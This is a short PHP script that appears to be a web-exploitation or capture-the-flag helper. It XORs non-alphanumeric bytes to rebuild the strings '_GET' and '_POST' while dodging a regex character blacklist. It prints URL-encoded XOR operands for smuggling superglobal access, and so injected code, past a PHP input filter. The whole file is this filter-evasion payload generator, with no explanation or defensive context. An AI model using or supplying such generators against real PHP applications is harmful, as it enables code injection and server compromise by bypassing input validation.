<?php

function gen($pl) {
	$aa = "";
	$bb = "";
	for ($j = 0; $j < strlen($pl); $j++) {
		for ($i = 0xa0; $i < 0xff; $i++) {
			if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($i)) == 0) {
				$t = chr($i) ^ $pl[$j];
				if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $t) == 0) {
					$aa .= chr($i);
					$bb .= $t;
					break;
				}
			}
		}
	}
	return str_replace("%", "\x", urlencode($aa) . "^" . urlencode($bb) . "\r\n");
}

echo "_GET\r\n";
echo gen("_GET");
echo "_POST\r\n";
echo gen("_POST");